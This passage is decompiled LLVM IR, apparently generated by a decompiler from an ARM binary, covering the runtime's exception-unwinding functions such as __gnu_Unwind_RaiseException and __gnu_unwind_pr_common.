  %v1_196bc = inttoptr i32 %v1_196b8 to i32*
  %v2_196bc = call i32 @__restore_core_regs(i32* %v1_196bc)
  store i32 %v2_196bc, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 4, 3, 7, 9, 8, 5, 6, 2, 1, 0 }
  uselistorder label %dec_label_pc_196b8, { 1, 0 }
  uselistorder label %dec_label_pc_196b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_19684, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_196c0 = add i32 %ucbp, 20
  %v2_196c0 = inttoptr i32 %v1_196c0 to i32*
  %v3_196c0 = load i32, i32* %v2_196c0, align 4
  %v1_196c8 = load i32, i32* %r1.global-to-local, align 4
  %v2_196c8 = add i32 %v1_196c8, 64
  %v3_196c8 = inttoptr i32 %v2_196c8 to i32*
  store i32 %v3_196c0, i32* %v3_196c8, align 4
  %v1_196cc = add i32 %ucbp, 12
  %v2_196cc = inttoptr i32 %v1_196cc to i32*
  %v3_196cc = load i32, i32* %v2_196cc, align 4
  %v2_196d0 = icmp eq i32 %v3_196cc, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_196dc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_196dc, i32* @r5, align 4
  br i1 %v2_196d0, label %dec_label_pc_196e4, label %dec_label_pc_19720

dec_label_pc_196e4:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_196f0 = add i32 %ucbp, 16
  %v2_196f0 = inttoptr i32 %v1_196f0 to i32*
  %v3_196f0 = load i32, i32* %v2_196f0, align 4
  call void @__pseudo_branch(i32 %v3_196f0)
  br i1 false, label %dec_label_pc_19718, label %dec_label_pc_19704

dec_label_pc_19704:                               ; preds = %dec_label_pc_196e4
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_146e8.689 to i32))
  %v0_1970c = load i32, i32* @r4, align 4
  %v0_19710 = load i32, i32* @r5, align 4
  store i32 %v0_19710, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_1970c, i32 %v0_19710)
  br label %dec_label_pc_19718

dec_label_pc_19718:                               ; preds = %dec_label_pc_196e4, %dec_label_pc_19704
  %v0_19718 = load i32, i32* @r5, align 4
  %v1_19718 = add i32 %v0_19718, 4
  %v1_1971c = inttoptr i32 %v1_19718 to i32*
  %v2_1971c = call i32 @__restore_core_regs(i32* %v1_1971c)
  %v1_19724.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_19720

dec_label_pc_19720:                               ; preds = %entry, %dec_label_pc_19718
  %v1_19724 = phi i32 [ %v0_196dc, %entry ], [ %v1_19724.pre, %dec_label_pc_19718 ]
  %v3_19724 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_19724, i32 1)
  %v0_19728 = call i32 @abort()
  ret i32 %v0_19728

; uselistorder directives
  uselistorder i32 ()* @abort, { 7, 6, 2, 1, 4, 3, 8, 10, 5, 9, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 44, 45, 46, 47, 48, 50, 21, 18, 19, 20, 14, 15, 16, 22, 23, 17, 5, 6, 7, 8, 9, 10, 11, 12, 13, 29, 55, 59, 58, 57, 51, 52, 1, 36, 37, 30, 31, 32, 53, 54, 56, 38, 39, 49, 40, 33, 41, 24, 25, 0, 26, 27, 28, 34, 35, 42, 43, 2, 3, 4 }
  uselistorder i1 true, { 0, 1, 2, 3, 109, 145, 4, 146, 147, 148, 149, 5, 94, 128, 150, 6, 93, 151, 7, 92, 152, 153, 154, 155, 8, 156, 129, 9, 96, 157, 10, 95, 158, 159, 11, 160, 161, 162, 12, 163, 164, 13, 165, 14, 131, 166, 167, 130, 168, 169, 15, 97, 16, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 18, 99, 19, 180, 181, 182, 20, 98, 183, 21, 17, 184, 185, 22, 186, 187, 188, 23, 189, 190, 191, 192, 193, 24, 25, 132, 26, 27, 28, 29, 144, 100, 194, 195, 101, 196, 134, 197, 198, 31, 199, 200, 32, 102, 202, 30, 203, 201, 204, 133, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 106, 45, 46, 47, 48, 49, 116, 115, 50, 223, 91, 107, 113, 205, 114, 214, 206, 137, 207, 208, 51, 209, 52, 53, 210, 211, 108, 212, 213, 104, 215, 216, 217, 218, 219, 220, 54, 55, 221, 222, 136, 135, 66, 67, 68, 224, 69, 70, 117, 118, 123, 119, 124, 111, 122, 225, 112, 127, 226, 56, 227, 57, 58, 59, 228, 138, 139, 60, 61, 229, 140, 141, 62, 63, 230, 142, 143, 64, 65, 110, 231, 232, 125, 233, 71, 103, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 235, 236, 237, 238, 120, 239, 240, 241, 242, 243, 244, 245, 86, 87, 246, 88, 89, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 85, 262, 263, 264, 265, 266, 267, 84, 268, 105, 121, 126, 90, 269, 82, 83, 234, 270 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_19720, { 1, 0 }
  uselistorder label %dec_label_pc_19718, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_1972c = load i32, i32* @r4, align 4
  store i32 %v3_1972c, i32* %stack_var_-16, align 4
  %v6_1972c = load i32, i32* @r5, align 4
  %v9_1972c = load i32, i32* @r6, align 4
  %v12_1972c = load i32, i32* @lr, align 4
  %v1_19730 = add i32 %entry_vrs, 60
  %v2_19730 = inttoptr i32 %v1_19730 to i32*
  %v3_19730 = load i32, i32* %v2_19730, align 4
  %v2_19734 = add i32 %entry_vrs, 64
  %v3_19734 = inttoptr i32 %v2_19734 to i32*
  store i32 %v3_19730, i32* %v3_19734, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_19764 = load i32, i32* %v3_19734, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_1977c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_19764)
  %v2_19780 = icmp eq i32 %v2_1977c, 0
  br i1 %v2_19780, label %dec_label_pc_19788, label %dec_label_pc_197bc

dec_label_pc_19788:                               ; preds = %entry
  %v0_19788 = load i32, i32* @r5, align 4
  %v1_19790 = add i32 %v0_19788, 16
  %v2_19790 = inttoptr i32 %v1_19790 to i32*
  %v3_19790 = load i32, i32* %v2_19790, align 4
  call void @__pseudo_branch(i32 %v3_19790)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_197a8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_197ac = urem i32 %v2_197a8, 2
  %v2_197ac = icmp eq i32 %v1_197ac, 0
  br i1 %v2_197ac, label %dec_label_pc_197cc, label %dec_label_pc_197b4

dec_label_pc_197b4:                               ; preds = %dec_label_pc_19788, %dec_label_pc_197cc
  %v0_197b4 = phi i1 [ false, %dec_label_pc_19788 ], [ %phitmp, %dec_label_pc_197cc ]
  br i1 %v0_197b4, label %dec_label_pc_197d8, label %dec_label_pc_197bc

dec_label_pc_197bc:                               ; preds = %entry, %dec_label_pc_197b4
  %v2_197c4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_197c4, i32* @r4, align 4
  store i32 %v6_1972c, i32* @r5, align 4
  store i32 %v9_1972c, i32* @r6, align 4
  store i32 %v12_1972c, i32* @lr, align 4
  ret i32 9

dec_label_pc_197cc:                               ; preds = %dec_label_pc_19788
  %v2_197cc = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_197cc, i32* @r0, align 4
  %v1_197d0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_197cc)
  %v0_197b4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_197b4.pre, 6
  br label %dec_label_pc_197b4

dec_label_pc_197d8:                               ; preds = %dec_label_pc_197b4
  %v0_197d8 = load i32, i32* @r5, align 4
  %v0_197dc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_197d8, i32 %v0_197dc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder void (i32, i32)* @unwind_phase2, { 1, 0 }
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_197bc, { 1, 0 }
  uselistorder label %dec_label_pc_197b4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_197e4 = add i32 %ucbp, 12
  %v2_197e4 = inttoptr i32 %v1_197e4 to i32*
  %v3_197e4 = load i32, i32* %v2_197e4, align 4
  %v2_197e8 = icmp eq i32 %v3_197e4, 0
  br i1 %v2_197e8, label %dec_label_pc_197f0, label %dec_label_pc_197f4

dec_label_pc_197f0:                               ; preds = %entry
  %v2_197f0 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_197f4

dec_label_pc_197f4:                               ; preds = %entry, %dec_label_pc_197f0
  %v1_197f4 = add i32 %entry_vrs, 60
  %v2_197f4 = inttoptr i32 %v1_197f4 to i32*
  %v3_197f4 = load i32, i32* %v2_197f4, align 4
  %v2_197fc = add i32 %entry_vrs, 64
  %v3_197fc = inttoptr i32 %v2_197fc to i32*
  store i32 %v3_197f4, i32* %v3_197fc, align 4
  %v3_19800 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_19800

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_197f4, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_19860

bb:                                               ; preds = %entry
  %v7_19818 = mul i32 %regclass, 4
  %v8_19818 = add i32 %v7_19818, ptrtoint (i32* @global_var_19820.838 to i32)
  call void @__pseudo_branch(i32 %v8_19818)
  br label %dec_label_pc_19860

dec_label_pc_19860:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_19948 = load i32, i32* @r4, align 4
  %v6_19948 = load i32, i32* @r5, align 4
  %v2_19958 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_19960 = add i32 %ucbp, 76
  %v2_19960 = inttoptr i32 %v1_19960 to i32*
  %v3_19960 = load i32, i32* %v2_19960, align 4
  %v1_1996c = inttoptr i32 %v3_19960 to i32*
  %v2_1996c = load i32, i32* %v1_1996c, align 4
  store i32 %v2_1996c, i32* @lr, align 4
  %v4_1996c = add i32 %v3_19960, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_19978 = urem i32 %state, 4
  store i32 %v1_19978, i32* %r2.global-to-local, align 4
  %v1_1997c = and i32 %state, 8
  store i32 %v1_1997c, i32* %r0.global-to-local, align 4
  %v4_1998c = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_1996c, i32* %v4_1998c, align 8
  br i1 %v2_19958, label %dec_label_pc_1999c, label %dec_label_pc_19c78

dec_label_pc_1999c:                               ; preds = %entry
  %v3_1999c = mul i32 %v2_1996c, 256
  store i32 %v3_1999c, i32* %v4_1998c, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_199b4

dec_label_pc_199b4:                               ; preds = %dec_label_pc_19c78, %dec_label_pc_1999c
  %v0_199d8647090 = phi i32 [ %v2_19c90, %dec_label_pc_19c78 ], [ %v4_1996c, %dec_label_pc_1999c ]
  store i32 %v1_19978, i32* %r2.global-to-local, align 4
  %v1_199b8 = add i32 %ucbp, 80
  %v2_199b8 = inttoptr i32 %v1_199b8 to i32*
  %v3_199b8 = load i32, i32* %v2_199b8, align 4
  %v7_199bc = icmp eq i32 %v1_19978, 2
  br i1 %v7_199bc, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_199b4
  %v2_199c0 = add i32 %ucbp, 56
  %v3_199c0 = inttoptr i32 %v2_199c0 to i32*
  %v4_199c0 = load i32, i32* %v3_199c0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_199b4, %bb
  %v0_199d86470 = phi i32 [ %v0_199d8647090, %dec_label_pc_199b4 ], [ %v4_199c0, %bb ]
  %v1_199c4 = urem i32 %v3_199b8, 2
  %v2_199c4 = icmp eq i32 %v1_199c4, 0
  br i1 %v2_199c4, label %dec_label_pc_199d8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_19a98

dec_label_pc_199d8.preheader:                     ; preds = %bb148
  %v1_199d86571 = inttoptr i32 %v0_199d86470 to i32*
  %v2_199d86672 = load i32, i32* %v1_199d86571, align 4
  %v2_199dc6874 = icmp eq i32 %v2_199d86672, 0
  br i1 %v2_199dc6874, label %dec_label_pc_19a98, label %dec_label_pc_199e4.preheader.lr.ph.lr.ph

dec_label_pc_199e4.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_199d8.preheader
  %v7_199e8 = icmp eq i32 %id, 2
  %v2_19a74 = icmp eq i32 %v1_19978, 0
  %v2_19c40 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_19b5c = icmp eq i32 %v1_1997c, 0
  br label %dec_label_pc_199e4.preheader.lr.ph

dec_label_pc_199e4.preheader.lr.ph:               ; preds = %dec_label_pc_199e4.preheader.lr.ph.lr.ph, %dec_label_pc_19cac
  %v1_199f496 = phi i32 [ %v2_199d86672, %dec_label_pc_199e4.preheader.lr.ph.lr.ph ], [ %v2_199d866, %dec_label_pc_19cac ]
  %v1_199f093 = phi i32 [ %v0_199d86470, %dec_label_pc_199e4.preheader.lr.ph.lr.ph ], [ %v2_19cb0, %dec_label_pc_19cac ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_199e4.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_19cac ]
  br label %dec_label_pc_199e4.preheader

dec_label_pc_199e4.preheader:                     ; preds = %dec_label_pc_199e4.preheader.lr.ph, %dec_label_pc_19c70
  %v1_199f495 = phi i32 [ %v1_199f496, %dec_label_pc_199e4.preheader.lr.ph ], [ %v2_199d8, %dec_label_pc_19c70 ]
  %v1_199f092 = phi i32 [ %v1_199f093, %dec_label_pc_199e4.preheader.lr.ph ], [ %v1_19c70, %dec_label_pc_19c70 ]
  br label %dec_label_pc_199e4

dec_label_pc_199e4:                               ; preds = %dec_label_pc_199e4.preheader, %dec_label_pc_19a88
  %v1_199f4 = phi i32 [ %v1_199f495, %dec_label_pc_199e4.preheader ], [ %v2_19a8c, %dec_label_pc_19a88 ]
  %v1_19a08 = phi i32 [ %v1_199f092, %dec_label_pc_199e4.preheader ], [ %v1_19a88, %dec_label_pc_19a88 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_199e8, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_199e4
  %v2_199ec = add i32 %v1_19a08, 4
  %v3_199ec = inttoptr i32 %v2_199ec to i32*
  %v4_199ec = load i32, i32* %v3_199ec, align 4
  store i32 %v4_199ec, i32* @r5, align 4
  store i32 %v1_199f4, i32* @r6, align 4
  %v0_199f8109 = load i32, i32* @r8, align 4
  %v1_199f8110 = add i32 %v0_199f8109, 72
  %v2_199f8111 = inttoptr i32 %v1_199f8110 to i32*
  %v3_199f8112 = load i32, i32* %v2_199f8111, align 4
  store i32 %v3_199f8112, i32* @lr, align 4
  %v2_19a04 = add i32 %v1_19a08, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_199e4
  %v2_199f0 = add i32 %v1_19a08, 2
  %v3_199f0 = inttoptr i32 %v2_199f0 to i16*
  %v4_199f0 = load i16, i16* %v3_199f0, align 2
  %v5_199f0 = zext i16 %v4_199f0 to i32
  store i32 %v5_199f0, i32* @r5, align 4
  %v0_199f8 = load i32, i32* @r8, align 4
  %v1_199f8 = add i32 %v0_199f8, 72
  %v2_199f8 = inttoptr i32 %v1_199f8 to i32*
  %v3_199f8 = load i32, i32* %v2_199f8, align 4
  store i32 %v3_199f8, i32* @lr, align 4
  %v2_19a00 = inttoptr i32 %v1_19a08 to i16*
  %v3_19a00 = load i16, i16* %v2_19a00, align 2
  %v4_19a00 = zext i16 %v3_19a00 to i32
  store i32 %v4_19a00, i32* @r6, align 4
  %v2_19a08 = add i32 %v1_19a08, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_19a08, %.thread16 ], [ %v2_19a04, %bb151 ]
  %v3_199f8115 = phi i32 [ %v3_199f8, %.thread16 ], [ %v3_199f8112, %bb151 ]
  %v0_19a10113 = phi i32 [ %v5_199f0, %.thread16 ], [ %v4_199ec, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_19a10 = and i32 %v0_19a10113, -2
  %v2_19a14 = add i32 %v1_19a10, %v3_199f8115
  store i32 %v2_19a14, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19a24 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19a24, i32* %r0.global-to-local, align 4
  %v5_19a30 = call i32 @_Unwind_VRS_Get(i32 %v0_19a24, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19a30, i32* %r0.global-to-local, align 4
  %v3_19a34 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_19a34, i32* %r2.global-to-local, align 4
  %v0_19a38 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_19a38, %v3_19a34
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_19a44

._crit_edge:                                      ; preds = %bb152
  %v0_19a5c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_19a44:                               ; preds = %bb152
  %v0_19a44 = load i32, i32* @r6, align 4
  %v1_19a44 = and i32 %v0_19a44, -2
  %v2_19a48 = add i32 %v1_19a44, %v0_19a38
  %v3_19a4c = icmp ult i32 %v3_19a34, %v2_19a48
  br i1 %v3_19a4c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_19a44
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_19a44
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_19a5c = phi i32 [ %v0_19a5c.pre, %._crit_edge ], [ %v0_19a44, %bb153 ], [ %v0_19a44, %.thread20 ]
  %v0_19c04 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_19a58 = load i32, i32* @r5, align 4
  %v1_19a5c = urem i32 %v0_19a5c, 2
  %v1_19a58 = mul i32 %v0_19a58, 2
  %v3_19a60 = and i32 %v1_19a58, 2
  %v4_19a60 = or i32 %v3_19a60, %v1_19a5c
  store i32 %v4_19a60, i32* %r2.global-to-local, align 4
  %v7_19a64 = icmp eq i32 %v4_19a60, 1
  br i1 %v7_19a64, label %dec_label_pc_19bf8, label %dec_label_pc_19a6c

dec_label_pc_19a6c:                               ; preds = %bb154
  %v2_19a64 = icmp eq i32 %v4_19a60, 0
  br i1 %v2_19a64, label %dec_label_pc_19a70, label %dec_label_pc_19b20

dec_label_pc_19a70:                               ; preds = %dec_label_pc_19a6c
  store i32 %v1_19978, i32* %r2.global-to-local, align 4
  br i1 %v2_19a74, label %.thread, label %bb155

.thread:                                          ; preds = %dec_label_pc_19a70
  %v0_19a88119 = load i32, i32* @r7, align 4
  br label %dec_label_pc_19a88

bb155:                                            ; preds = %dec_label_pc_19a70
  %v2_19a80 = icmp eq i32 %v0_19c04, 0
  %v0_19a88 = load i32, i32* @r7, align 4
  br i1 %v2_19a80, label %dec_label_pc_19a88, label %dec_label_pc_19e00

dec_label_pc_19a88:                               ; preds = %.thread, %bb155
  %v0_19a88120 = phi i32 [ %v0_19a88119, %.thread ], [ %v0_19a88, %bb155 ]
  %v1_19a88 = add i32 %v0_19a88120, 4
  %v1_19a8c = inttoptr i32 %v1_19a88 to i32*
  %v2_19a8c = load i32, i32* %v1_19a8c, align 4
  %v2_19a90 = icmp eq i32 %v2_19a8c, 0
  br i1 %v2_19a90, label %dec_label_pc_19a98, label %dec_label_pc_199e4

dec_label_pc_19a98:                               ; preds = %dec_label_pc_19cac, %dec_label_pc_19c70, %dec_label_pc_19a88, %dec_label_pc_199d8.preheader, %bb149
  %stack_var_-76.3 = phi i32 [ 0, %bb149 ], [ 0, %dec_label_pc_199d8.preheader ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19a88 ], [ %stack_var_-76.2.ph3175, %dec_label_pc_19c70 ], [ %stack_var_-76.4, %dec_label_pc_19cac ]
  %v0_19a98 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19a98, i32* %r0.global-to-local, align 4
  %tmp156 = bitcast %anon_struct_4* %uws_-60 to %anon_struct_13*
  %v4_19aa0 = call i32 @__gnu_unwind_execute(i32 %v0_19a98, %anon_struct_13* %tmp156)
  store i32 %v4_19aa0, i32* %r0.global-to-local, align 4
  store i32 %v4_19aa0, i32* %r5.global-to-local, align 4
  %v2_19aa4 = icmp eq i32 %v4_19aa0, 0
  br i1 %v2_19aa4, label %dec_label_pc_19aac, label %dec_label_pc_19b28

dec_label_pc_19aac:                               ; preds = %dec_label_pc_19a98
  store i32 %stack_var_-76.3, i32* %r2.global-to-local, align 4
  %v2_19ab0 = icmp eq i32 %stack_var_-76.3, 0
  br i1 %v2_19ab0, label %bb157, label %dec_label_pc_19abc

bb157:                                            ; preds = %dec_label_pc_19aac
  store i32 8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b2c

dec_label_pc_19abc:                               ; preds = %dec_label_pc_19aac
  %v2_19abc = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_19abc, i32* %r4.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_19acc = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19acc, i32* %r0.global-to-local, align 4
  %tmp158 = bitcast i32* %stack_var_-48 to i8*
  %v7_19ad4 = call i32 @_Unwind_VRS_Get(i32 %v0_19acc, i32 0, i32 15, i32 0, i8* %tmp158)
  %v0_19ad8 = load i32, i32* %r5.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 %v0_19acc, i32* %r0.global-to-local, align 4
  %v5_19aec = call i32 @_Unwind_VRS_Set(i32 %v0_19acc, i32 %v0_19ad8, i32 14, i32 %v0_19ad8, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19aec, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r2.global-to-local, align 4
  %v4_19af8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 32) to i32*), align 4
  %v0_19afc = load i32, i32* %r5.global-to-local, align 4
  %v0_19b00 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_19b00, i32* %r0.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v4_19af8, i32* %stack_var_-48, align 4
  %v5_19b14 = call i32 @_Unwind_VRS_Set(i32 %v0_19b00, i32 %v0_19afc, i32 15, i32 %v0_19afc, i8* bitcast (i32* @0 to i8*))
  store i32 7, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b2c

dec_label_pc_19b20:                               ; preds = %dec_label_pc_19a6c
  %v7_19b20 = icmp eq i32 %v4_19a60, 2
  br i1 %v7_19b20, label %dec_label_pc_19b38, label %dec_label_pc_19b28

dec_label_pc_19b28:                               ; preds = %dec_label_pc_19b20, %dec_label_pc_19c0c, %dec_label_pc_19a98, %dec_label_pc_19e00
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19b2c

dec_label_pc_19b2c:                               ; preds = %bb157, %dec_label_pc_19e38, %dec_label_pc_19dc8, %bb166, %dec_label_pc_19abc, %dec_label_pc_19b28
  %v1_19b34 = phi i32 [ 8, %bb157 ], [ 7, %dec_label_pc_19e38 ], [ %v1_19b34.pre, %dec_label_pc_19dc8 ], [ 7, %bb166 ], [ 7, %dec_label_pc_19abc ], [ 9, %dec_label_pc_19b28 ]
  store i32 %v3_19948, i32* %r4.global-to-local, align 4
  store i32 %v6_19948, i32* %r5.global-to-local, align 4
  ret i32 %v1_19b34

dec_label_pc_19b38:                               ; preds = %dec_label_pc_19b20
  store i32 %v1_19978, i32* %r2.global-to-local, align 4
  %v0_19b3c = load i32, i32* @r7, align 4
  %v1_19b3c = inttoptr i32 %v0_19b3c to i32*
  %v2_19b3c = load i32, i32* %v1_19b3c, align 4
  %tmp206 = bitcast i32 %v2_19b3c to float
  %tmp207 = call float @fabsf(float %tmp206)
  %v1_19b44 = bitcast float %tmp207 to i32
  store i32 %v1_19b44, i32* @sl, align 4
  br i1 %v2_19a74, label %dec_label_pc_19b4c, label %dec_label_pc_19cb8

dec_label_pc_19b4c:                               ; preds = %dec_label_pc_19b38
  %v2_19b4c = icmp eq i32 %v0_19c04, 0
  br i1 %v2_19b4c, label %dec_label_pc_19ca0, label %dec_label_pc_19b54

dec_label_pc_19b54:                               ; preds = %dec_label_pc_19b4c
  %v2_19b58 = icmp eq i32 %v1_19b44, 0
  br i1 %v2_19b58, label %dec_label_pc_19b64.thread, label %bb159

dec_label_pc_19b64.thread:                        ; preds = %dec_label_pc_19b54
  br label %dec_label_pc_19dc8

bb159:                                            ; preds = %dec_label_pc_19b54
  br i1 %v3_19b5c, label %dec_label_pc_19b6c, label %dec_label_pc_19ca0

dec_label_pc_19b6c:                               ; preds = %bb159
  %v1_19b6c = add i32 %v0_19b3c, 4
  store i32 %v1_19b6c, i32* @r6, align 4
  store i32 100, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  %v0_19b7c = load i32, i32* @r8, align 4
  %v1_19b7c = add i32 %v0_19b7c, 88
  store i32 %v1_19b7c, i32* %sb.global-to-local, align 4
  store i32 %v1_19b6c, i32* @r4, align 4
  br label %dec_label_pc_19ba0

dec_label_pc_19b90:                               ; preds = %bb161
  %v1_19b90 = add i32 %v0_19b90, 1
  store i32 %v1_19b90, i32* @r5, align 4
  %v1_19b94 = load i32, i32* @sl, align 4
  %v9_19b94 = icmp eq i32 %v1_19b90, %v1_19b94
  %v0_19b98 = load i32, i32* @r4, align 4
  %v1_19b98 = add i32 %v0_19b98, 4
  store i32 %v1_19b98, i32* @r4, align 4
  br i1 %v9_19b94, label %dec_label_pc_19dc8, label %dec_label_pc_19b90.dec_label_pc_19ba0_crit_edge

dec_label_pc_19b90.dec_label_pc_19ba0_crit_edge:  ; preds = %dec_label_pc_19b90
  %v0_19bac.pre = load i32, i32* %sb.global-to-local, align 4
  br label %dec_label_pc_19ba0

dec_label_pc_19ba0:                               ; preds = %dec_label_pc_19b90.dec_label_pc_19ba0_crit_edge, %dec_label_pc_19b6c
  %v0_19bac = phi i32 [ %v0_19bac.pre, %dec_label_pc_19b90.dec_label_pc_19ba0_crit_edge ], [ %v1_19b7c, %dec_label_pc_19b6c ]
  %v1_19bb0 = phi i32 [ %v1_19b98, %dec_label_pc_19b90.dec_label_pc_19ba0_crit_edge ], [ %v1_19b6c, %dec_label_pc_19b6c ]
  %v1_19ba0 = inttoptr i32 %v1_19bb0 to i32*
  %v2_19ba0 = load i32, i32* %v1_19ba0, align 4
  %v2_19ba4 = icmp eq i32 %v2_19ba0, 0
  store i32 %v0_19bac, i32* %forced_unwind_-44, align 4
  br i1 %v2_19ba4, label %bb161, label %bb160

bb160:                                            ; preds = %dec_label_pc_19ba0
  br label %bb161

bb161:                                            ; preds = %dec_label_pc_19ba0, %bb160
  %v0_19bb4 = load i32, i32* @r8, align 4
  store i32 %v0_19bb4, i32* %r0.global-to-local, align 4
  store i32 %v2_19c40, i32* %r2.global-to-local, align 4
  %v4_19bc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 100) to i32*), align 4
  store i32 105424, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_19bc4)
  %v0_19bd0 = load i32, i32* %r0.global-to-local, align 4
  %v2_19bd0 = icmp eq i32 %v0_19bd0, 0
  %v0_19b90 = load i32, i32* @r5, align 4
  br i1 %v2_19bd0, label %dec_label_pc_19b90, label %dec_label_pc_19bd8

dec_label_pc_19bd8:                               ; preds = %bb161
